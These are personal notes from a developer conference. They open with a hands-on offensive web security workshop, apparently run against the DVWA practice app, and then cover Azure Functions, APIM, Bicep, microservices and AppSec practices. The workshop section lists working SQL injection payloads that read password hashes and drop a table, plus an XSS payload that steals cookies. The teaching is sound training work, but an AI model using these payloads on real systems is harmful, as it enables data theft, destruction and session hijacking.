# DevUp 2022

## Offensive Web Security Workshop

Files: bit.ly/3xi2hxs
Slides: https://t.co/0ypb9QvAZy

Github Links from the workshop
https://github.com/swisskyrepo/PayloadsAllTheThings/
https://github.com/alexedwards/argon2id
https://github.com/beefproject/beef
https://github.com/zaproxy/zaproxy
https://github.com/berzerk0/Probable-Wordlists
https://github.com/sqlmapproject/sqlmap
https://github.com/paragonie/awesome-appsec
https://github.com/exploitprotocol/app-sec-wiki
https://github.com/digininja/DVWA



### Overview
Web Application Firewall (logs) will show many common attempted attacks

    - Path traversal
    - Command injection
    - File Upload
    - File Inclusion
    -


### SQL injections

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

Start with a ' to juke the existing query syntax
End with a comment (`-- ` or `#`) to skip the end of the exsiting query (to resolve syntax errors after injection)

- List all Users. The or 1=1 makes the exsting query "always true"

    `' or 1=1 # `

Use `union select` to pivot into other queries

Result of your query must have the same number of columns as the exsitng query. You can find that out with something like
- Find out the number of columns in the current table/result (n + 1, so if the table has 2 colummns, the error will say `Unknown column '3' in 'order clause'`)

    `' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,`68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #


Use functions:
- Show version

    `' or 1=1 union select null, version() #`

- Show current time lol

    `0' or 1=1 union select null, now() #`

- Show current database

    `' or 1=1 union select null, database() #`

- Show user database is running as

    `' or 1=1 union select null, user() #`

Use other queries.

- List database tables

    `' and 1=1 union select null, table_name from information_schema.tables # `

- List column names of a table

    `' union select null, column_name from information_schema.columns where table_name = 'users' #`

    `' union select null, column_name from information_schema.columns where table_name = 'guestbook' #`

- Read comments from guestbook

    `' union select name, comment from guestbook #`

- Read passwords from users

    `' union select user_id, password from users #`

- Delete a table

    '; drop table guestbook #

### Cross site scripting

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Effective way of stealing cookies (Access user's cookie store and send somewhere)
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

BEEF is a tool which can be used to build xss scripts

excess-xss.com

### Cross Site Request Forgery

Abusing cookies for impersonation and priveledge escalation

With REST GET requests, site cookies are sent along with the request


### Direct Object Access

Look for IDs in URLs, etc

Mitigate with RBAC on resources.


### Session Management

jwt.io - Web UI for decoding Javascript Web Tokens

JWT's consist of 3 b64 blobs separated by '.' The first blob is a header, describing the type of token and hash algorithm to use for verification. Second is the paylod data (json). Third is a verification blob formatted as

    HMACSHA256(
        base64UrlEncode(header) + "." +
        base64UrlEncode(payload), +
        your salt
    )

JWTs are commonly used as "Session Tokens", which describe the session (lol) - ie, user, browser data, time, expiry time, etc.

"authentication tokens" which describe the user, their permissions, issue and expiry time

Always manage these infos as separate tokens. Don't combine Session and Authentication Tokens

SAML is an XML based standard for web browser single sign-on.



### Misc

Mitre tweets out every new CVE as they are published

https://www.exploit-db.com/ - Registry of known exploits
jwt.io - Web UI for decoding Javascript Web Tokens


Web Application Firewalls's
    - Good at detecting injection and XSS accacks
    - Won't help with Direct Object Access and most CSRF attacks
    - Deploy them in Dev & Staging Environments as well as Prod
    - Don't start in Prod or you will likely encounter unintended behavior
    - Can start with 'audit' vs 'block' mode to validate expected behavior

During upgrades, wipe everything (configs, static files) and start fresh :)

Don't hardcode secrets, use a vault, and rotate them

be wary of secret management in k8s

Design apps with security in mind. "Bolting On" security after the fact is error prone
Do threat modeling early, and revisit this exercise regularly. (Actors & Motivations)
Document the locations of all sensitive infomation in your application

Produce audit logs

Audit your dependencies (Vet them, Updates, etc). Regular minor version updates are much easier to deal with than infrequent large updates. Can do this during CICD
Run some static analysis during CICD as well

http://www.wechall.net/  - Registry of hack-the-box style sites and CTFs

https://www.pluralsight.com/authors/troy-hunt - Troy hunt's courses on pluralsight (ETH, Techniques, etc)

## REST Microservices with Azure Functions

### Representational State Transfer:
REST services are Stateless, Cache-able Layered, with a Consistent Interface

GET POST(create) PUT(update/overwrite) PATCH(partial update) DELETE

Status codes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status

### Serverless
Azure Function
- Docs: https://docs.microsoft.com/en-us/azure/azure-functions/
- Durable (Stateful) Function extension: https://docs.microsoft.com/en-us/azure/azure-functions/durable/durable-functions-overview
- Github: https://github.com/Azure/Azure-Functions

Serverless: Don't worry about config, scaling, and generally just think about the server, less 😜

Languages supported out of the box: c# js, pwsh, java, python, custom handlers for others
- Custom Handler docs for go https://docs.microsoft.com/en-us/azure/azure-functions/create-first-function-vs-code-other?tabs=go%2Cmacos

Cheap$ - Pay per use, not time. Premium plan allows for services to always be warm (And allows private IPs)
- Use includes # of requests, and also the amount of Memory used by your service while it's running

Integrates easily with other azure offerings. Event hub, storage accounts, etc - These services can also trigger functions

A 'Function App' is a project which can contain multiple 'Functions'. Triggering one Function will 'warm' all functions in the App.
Organize function apps for performance & scaleability. Don't want to spin up unrelated functions if you can avoid it

Q: Is 'CareType' an App, with a function for each HTTP method? Or were multiple APIs hosted by a more encompassing app

Each HTTP handler implemented as a separate function.

#### Gotchas:
Testing challenges:
    - Need to test interactions between services
    - Can bundle things and mock e2e tests

Security concerns: Shared infra by nature. Public IPs only unless on premium

Azure Functions have a capped runtime - 5min by default, but can push to 10 in settings. Other infra / paas offerings allow for long runtimes

You'll also suffer from a cold start, but on the other hand you don't pay for downtime. You can rig a service to ping your function every so often to keep it warm.

Vendor Lock in? Hard to migrate entire set-ups between providers

Avoid cross-function communication

Avoid sharing storage accounts (code for functions live in a SA. Separate Apps should use separate SA's)

Avoid blocking calls & use Async

## Lessons learned from the 737 Max

At takeoff: Redundent instruments read different measurements: Speed and AOA. Within 1min of takeoff the speed and altitude measurements were noticeably off

Double and triple check assumptions. Hire SMEs. Get as close to the problem as possibl

Fail safe instead of Fail-proof

Option to Opt out of automtaion in critical scenarios. Balance Reality and "Making life easier"

Use cases, Abuse cases, Safety cases. Don't assume safety - make it a requirement. Be wary when requirements are not technical (political)

"Writing Secure Code" book

No training = No awareness. MCAS system was kept behind a curtain

Cheap is Expensive. Countries trusted FAA. FAA trusted Boeing. Boeing outsourced

## Event driven Microservices

Producers, Ingestion (storage), Consumers
- Producers and Consumers don't need to know about each other

Allows decoupling & encapsulation of functionality

When to use
- Multiple subsystems
- Real Time processing
- Complex event handling
- High Volume applications

Drawbacks:
- Learning Curve
- Increased complexity (More infra)
- Loss of transactionality (Non-sequential - Eventually consistent)
- No *guarantee* that consumers will receive all events

Azure Event Hubs - a managed, real time ingestion service. Simple, trusted, scaleable
- docs: https://docs.microsoft.com/en-us/azure/event-hubs/
- Built on OSS services (Kafka, AMPQ, https)
- Charged by 'Throughput Units' (ingress & egress). Can enable auto scale-up, but need to implement scale-down through monitoring or something

Make sure consumers handle messages idempotently

## How to succeed at application security without even trying

- AppSec focuses on securing Application
- DevSec focuses on securing  Developer Actions
- DevSecOps focuses on securing Build chain

Security is a responsibility for dev teams. There are many ways to facillitate this.
Introducing the infosec color wheel: https://hackernoon.com/introducing-the-infosec-colour-wheel-blending-developers-with-red-and-blue-security-teams-6437c1a07700

Do threat modeling for your service on a regular basis. Answer
- Actors & Motivations
- What are we working on?
    - Services, data movement, boundaries, auth scope
- What can go wrong?
- What do we do about it?
- Is that good enough?
- What happens if X happens Y
- Security theatre - Imagine some crazy shit happens that changes how our services are used


Good logging is essential for catching security incidents. You should also audit/monitor those logs, looking for security-impactful events

A significant, rising amount of breaches over the last few years have installed ransomware. Have 3 backups of data, with immutable and an offline copy. Test Recovery

Practice Defense in depth:
- Implement MFA - passwords are terrible, test for weak ones, can block known word lists. Use a 3rd part auth provider
- Use Canaries - Fake user accounts, fake entries in robots.txt, and monitor for activity on these resources
- Use analytics to block suspicious activity (location, time, etc)
- Endpoint Detection & Response
- Static Analysis. Start doing this from day 1 if possible
- Dynamic Application Security Testing - Automate Common Vulnerabilities & Fuzzing w/ ZAP proxy in CICD before promotion

Interactive and Real-Time Application Security Tests/Protection exist, ML/AI to block unusual requests at runtime

Testing APIs can be hard, because the test is often separated from the backing logic.
For API security, watch for
- Which APIs serve sensitive information
- Understand which endpoints serve which info, and watch for utilization spikes
- Always control who can access. If anonymous access is allowed, explicitly mark those endpoints as such (add decorates on the handlers)

Unit Tests are important, because they allow you to upgrade libraries w/o fearing your code silently breaking. Write tests, you fool!

Pentesting is good, but doesn't need to be prioritized before implementing mitigations. If mgmt pushes for one, you can tell them
- Can't sit on the results (must fix). Customers may ask for the report
- retest can be expensive. but good pentesters will include this in the initial fee, and may even give scripts to repeat the exploit
- Some people don't give good insights, just tool output. It might not even be valid!
- Some groups outsource their pentesters to whoever
- Can do your own pentests! Red teaming in-house. Red Team vs Blue team games are fun and productive

Involve Development when selecting Vendors. Walk through user stories and get dev feedback on the implementation.
- Have multiple competitors and be willing to walk away.
- If you need to drop a vendor, do so incrementally (cut licenses in half)

Write and Publish post mortems for security events, just like reliability incidents

## Building reusable components that are actually reusable

Library of generic component elements meant to be useable in multiple projects and contexts

https://www.pluralsight.com/authors/cory-house

http://storybook.js.org Storybook is an open source tool for building UI components and pages in isolation

Reusable components allow for
- consistency
- less code
- reliable implementations
- faster development
- improved accessibility

They're tricky to plan for, and you should dedicate someone on your team full time to their construction. Another good idea is to rotate these maintainers into development teams so that they 'dogfood' their re-usable components. This feedback will help to continually improve the library

When planning a reusable component, decide on
- the audience for your library
- rigid or flexible use case
- atomic design (built from well defined, single purpose pieces). ex, a Button is an 'atom' - a signup form is a 'molecule', made from other atomic components.
- Will you Link, wrap, or Fork external libraries?
- Open or Inner Source?


Documenting your library
- How should devs or designers use these? Have a doc section for each audience
- Have demos of the component, w/ code & import examples. This will help people see how to compose different components into useful constructs. Detail the available props the component supports (Can generate these docs from docstrings - https://github.com/reactjs/react-docgen)
- Group situationally related components in your documentation
- Maintain good release notes (links to PRs, semVer, categorization). Semantic versioning is particularly valuable for reusable component libraries, to add clarity for devs when they upgrade the library in their projects
-

## Azure API Management w/ Functions

Demo repo: https://github.com/blgorman/DevUp_APIMDemoFunctionApp
Other repo from yesterday: https://github.com/blgorman/ServerlessMessagingDemystified
docs: https://docs.microsoft.com/en-us/azure/api-management/

APIM services allow a 'front door' to other API services. You can assign it a DNS name, and it manages authentication. You define API routes in your APIM service, which map to external API endpoints. ex: my-apim.azure.io/foo -> my-service.com/api/v1/foo

APIM endpoints can have inbound and outbound policies, to filter or modify requests
- inbound policies apply to requests to the APIM
- backend policies apply to requests from the APIM to other APIs
- outbound policies apply to responses from the APIM
https://docs.microsoft.com/en-us/azure/api-management/api-management-howto-policies
https://docs.microsoft.com/en-us/azure/api-management/api-management-policies

APIM endpoints are grouped into "Products"
Subscription Keys are given to Customers and can be used to gate access to Products, monitor utilization, rate limit, etc


APIM tiers:
- consumption based - Has an SLA, no cap, $0.035 / 10k requests
- developer based - No SLA, All features, 500r/s, $50/month
- standard and higher have an SLA, All features, higher caps and higher prices

How to auth:
- Create "Subscription Key"s for your API products in APIM
- Configure the backend API to use Authentication (ie, Add Identity Provider authentication setting to your Function App)
- Configure the APIM service to authenicate with the backend API (ie, Give APIM an AAD Manged Identity and give that Identity Permission to hit the App)

https://docs.microsoft.com/en-us/azure/api-management/api-management-howto-protect-backend-with-aad
https://docs.microsoft.com/en-us/azure/api-management/mitigate-owasp-api-threats


## Distributed Systems Fail

Failures is _always_ an option with Distributed Systems. (_RABBITMQ!!!!_)
Your coffee shop doesn't use two-phase commit: https://ieeexplore.ieee.org/document/1407829

Imagine this scenario: Customer hits submit on checkout page...
- Get customer ID from DB
- Build Order object from Cart & Customer ID
- Call payment API
- Send Order downstream (packaging, shipping, fulfillment)
- Send thankyou email
- Commit order to DB

Strategies for handling failures:
- Ignore (not great, not terrible 😅)
- Retry (Good if idempotent options are available)
- Undo (Can be complex to do this logic)
- Coordination
    - Add extra logic to monitor state
    - do critical actions once other state is successful

At a some point, we should realize that there is too much going on in the context of a single button click. Instead the button click should kick off some background process. Different ideas can be found in the ["Enterprise Integration Patterns" book ](https://www.enterpriseintegrationpatterns.com/)

Routing-Slip process
- Clicking the button adds a task to an "outbox" queue. Checkout Complete
- Cronjob processes outbox regularly
- Task "routes" between various backend steps (payment, sendgrid, rabbit)
- Each step marks the Tasks's routing slip as completed
- WHen routing slip is complete the task is done

Saga pattern
- Requires knowing how to undo each step
- Do each step sequentially
- If one failes, go backwards, undoing each previous step

Process Manager patterns
- Process Manager taks task from outbox
- Coordinates w/ each step
- Orchestration (command based, process coupling) or Choreography (event based, decoupled processes)

Process Manager example:
- Process manager gets order from outbox
- Process manager first issues stripe command (Orchestration)
- Upon success Process manager triggers email & fulfillment services (Choreography)
- Commit completed task to DB

## Pump up your cloud infrastructure with Azure Bicep

https://github.com/DustinEwers/bicep-demos
https://docs.microsoft.com/EN-US/azure/azure-resource-manager/bicep/
https://github.com/azure/bicep

Infrastructure as Code!
- Speed & Automation
- Consistency & Repeatability
- Version Control

Procedural IaC - "Recipes" ie Script with CLIs ie "Here is what to do"

Declarative IaC - Manifests ie "Here is what I want"

ARM sucks - Verbose, Lots of JSON, tough to learn

Bicep Templates are a 1P alternative to ARM Templates which support 100% of Azure APIs
ARM resource properies are 1:1 with resource properties in Bicep
Bicep templates are applied the same way an ARM template would be (az create ... --template=foo.bicep)

ex:
```
var serviceName = myAppService-${region}

resource serverfarms_AppService 'Microsoft.Web/serverfarms@2020-09-01' = {
  name: serviceName
  location: location
  sku: {
    name: appSkuName
    tier: appSkuTier
  }
  kind: 'linux'
  properties: {
    isSpot: false
    reserved: true
    hyperV: false
  }
}

```

- Install the bicep cli extension: `az bicep install`
- There is a VS Code Bicep Extension
- Can do enums with @allowed = {foo, bar}
- Can do string interpolation with ${var}-thing
- Dependencies with dependsOn: [resource1, resource2]
- builtin functions: uniqueString(), toLower(), resourceId(), Contains()
- The @secure() decorator will ensure that a variable is not logged
- KeyVault & Bicep: https://docs.microsoft.com/en-us/azure/azure-resource-manager/bicep/key-vault-parameter?tabs=azure-cli
- Note: Removing something from Bicep and re-applying won't result in the resource being deleted, unless you use a 'complete' deployment strategy

You can organize templates into modules. Modules can output variables to be used in the outer template.
You can setup a Registry of bicep modules and reference them in other places https://docs.microsoft.com/en-us/azure/azure-resource-manager/bicep/private-module-registry?tabs=azure-powershell

Pro Tips:
- Reference with quickstart templates https://azure.microsoft.com/en-us/resources/templates/
- Cheat by exporting ARM templates from portal for the resources you want
    - And then modify the ARM template by isolating variables & translating to bicep
- There is a `az bicep decompile --file my-arm.json` command which might help ^
- Incorporate bicep into pipelines!

## CLI goodness

https://twitter.com/ryapric

There's a shellcheck extension for vscode

Use `wait` after backgrounding a task
- wait %job_num

`seq 1 5` evaluates to 1 2 3 4 5. Good for loops

xargs - not just for doing multiple things at once! Use `-I` to interpolate stdin into an arbitrary place of the command
    `echo "foo" | xargs -I{} curl -H 'My-Thing: {}' google.com`.
With xargs, you don't need to use {}'s as your interpolation character. For instance `-I::`.
Be careful with xargs for parallelization - It is particular about it's inputs with how it schedules

Use the `parallel` command instead of xargs! `parallel -j1 python foo.py :::: logfiles.txt` (the colons is a parallel syntax for 'take each line of this file and pass it as input to a job). It also takes a -S flag, which allows you to pass SSH configs, to run commands on multiple different computers at once.

awk programs can be split across multiple lines 🤯

## More on Azure APIM "The taming of the API"

What is API management?
- Creating And Publishing APIs
- Enforcing Usage Polices
- Controlling Access
- Nuturing The Dev Community
- Tracking Usage
- Performace Reporting

Benefits:
- Data-Driven decision making
- Security
- Documentation
- Centralized Visibility
- Monetization
- Optimize Business Value
- Positive User Experience
- Agile ????
- B2B Integrations
- Front-end Legacy Systems

Components:
- API Gateway
- Policy Manager
- Developer Portal
- Reporting & Analytics
- Lifecycle Management
- Money Machine (Monetization System)

Azure APIM
- Multiple tiers w/ different restrictions
- Running AppInsights for the APIM can hurt performance, recommend to not run unless you're having issues?
- Managed Identity to integrate APIM w/ other Azure services
- APIM takes a while to create (~1hr)
- Scaleable in "Scale Units". Each unit increases max throughput by 1x the advertised rate
- HTTP and Websocket APIs supported
- Can register backend APIs in APIM w/ OpenAPI spec json, manually, or templates
- Always Up-to-Date Developer Portal w/ API docs comes with Azure APIM. Docs for this: https://docs.microsoft.com/en-us/azure/api-management/api-management-howto-developer-portal
